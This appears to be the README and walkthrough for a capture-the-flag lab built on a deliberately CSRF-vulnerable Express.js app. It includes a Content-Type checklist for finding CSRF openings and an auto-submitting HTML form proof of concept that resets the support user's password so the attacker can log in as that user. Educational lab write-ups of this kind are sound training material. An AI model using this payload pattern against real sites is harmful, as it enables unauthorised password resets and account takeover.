# CSRF CTF

**Installation**
```
git clone https://github.com/JoshMorrison99/Express-CSRF; cd Express-CSRF; docker-compose up --build
```


## Findings
Handling reqests in Express.js it is quite common to use JSON like so:
```js
app.post('/api/reset_password', async (req, res) => {
    console.log(req.body.password)
})
```

Sending the following request will reset the password:
```
POST /api/reset_password HTTP/1.1
Host: localhost:5000
Content-Type: application/json
Cookie: SESS_COOKIE=s%3AqpqwMG8nJEa6lR7sUkdS%2B2%2B%2FLnfYkCCA

{"password":"123"}
```

Notice in the request above that the Content-Type is `application/json`. CSRF is not possible in this Content-Type. Before attempting CSRF, check if any of the following Content-Types are accepted:
```
Content-Type: text/plain  
Content-Type: application/x-www-form-urlencoded  
Content-Type: application/xml
```

If an express application only allows JSON, then the middleware will look like so:
```js
app.use(express.json());
```

If the express application accepts `application/json` and `application/x-www-form-urlencoded `
```js
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
```

## Writeup
**Step 1**<br/>
When you start the application you are greeted with a login screen. You are given the login of `guest:guest`.
![image](https://user-images.githubusercontent.com/25315255/220460691-37fb0674-685d-447d-b63f-fd64e9e8cb00.png)


**Step 2**<br/>
After logging into the application there is a navigation bar with some routes to investigate.
![image](https://user-images.githubusercontent.com/25315255/220460837-1073221d-d057-4458-9aaf-db1d7bd64565.png)

**Step 3**<br/>
Starting with `Profile` you can reset your password.
![image](https://user-images.githubusercontent.com/25315255/220461031-4e96af9a-059e-4530-a5b6-65ba65a84ada.png)

**Step 4**<br/>
Moving over to `Support` you can give a URL and the support staff will check out the URL.
![image](https://user-images.githubusercontent.com/25315255/220461194-812e8c7e-aa57-4093-96a7-bc4578d3603a.png)

**Step 5**<br/>
Some things to try on the support page would be SSRF. This CTF however is not vulnerable to SSRF. The intended solution of to perform a CSRF attack to reset the support user's password and login as the support user. We can use the following CSRF PoC to reset the support user's password:
```
<html>
    <body>
        <form action="https://{IP}/api/reset_password" method="POST">
            <input type="hidden" name="password" value="12345" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

**Step 6**<br/>
After resetting the support user's password, we can login.
![image](https://user-images.githubusercontent.com/25315255/220461899-c0bde596-6dc7-4964-abb7-2189171e8a49.png)


